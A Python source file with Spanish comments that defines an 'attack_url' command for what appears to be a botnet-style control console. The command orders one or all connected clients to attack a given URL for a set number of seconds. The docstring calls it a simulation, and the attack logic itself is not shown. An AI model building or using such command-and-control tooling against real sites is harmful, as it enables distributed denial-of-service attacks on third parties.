from cmd2 import CommandSet, with_default_category, Cmd2ArgumentParser, with_argparser
from utils.logger import get_console
import time
from utils.validator import validate_client_spec

@with_default_category("Comandos de Red")
class AttackURLCommand(CommandSet):
    """Comando para simular un ataque a una URL en uno o todos los clientes."""

    attack_url_parser = Cmd2ArgumentParser(description="Simula un ataque a una URL durante un tiempo determinado.")
    attack_url_parser.add_argument("--url", type=str, required=True, help="URL objetivo del ataque")
    attack_url_parser.add_argument("--tiempo", type=int, required=True, help="Duración del ataque en segundos")
    attack_url_parser.add_argument("--client", type=str, default="all", help="ID del cliente o 'all' (por defecto: all)")

    @with_argparser(attack_url_parser)
    def do_attack_url(self, args):
        """Simula un ataque a una URL en uno o todos los clientes.
        Uso: attack_url --url <url> --tiempo <tiempo> [--client <ID|all>]
        Ejemplo: attack http://example.com 10 --client 1"""
        console = get_console()

        # Validar URL
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            console.print("[bold red]Error: La URL debe comenzar con http:// o https://[/bold red]")
            return

        # Validar clientes conectados
        if not self._cmd.client_manager.obtener_clientes_conectados():
            console.print("[bold red]Error: No hay clientes conectados.[/bold red]")
            return

        # Validar cliente
        cliente_id = None
        if args.client != "all":
            if not validate_client_spec(args.client):
                console.print("[bold red]Error: ID de cliente debe ser un número o 'all'.[/bold red]")
                return
            try:
                cliente_id = int(args.client)
                if not self._cmd.client_manager.servidor.obtener_cliente_por_id(cliente_id):
                    console.print(f"[bold red]Error: Cliente con ID {cliente_id} no existe.[/bold red]")
                    return
            except ValueError:
                console.print("[bold red]Error: ID de cliente debe ser un número o 'all'.[/bold red]")
                return

        try:
            console.print(f"[bold green]Comando enviado: atacar URL '{args.url}' durante {args.tiempo} segundos[/bold green]")
            resultado = self._cmd.client_manager.enviar_comando_attack_url(args.url, args.tiempo, cliente_id)

        except Exception as e:
            console.print(f"[bold red]Error al enviar comando: {e}[/bold red]")
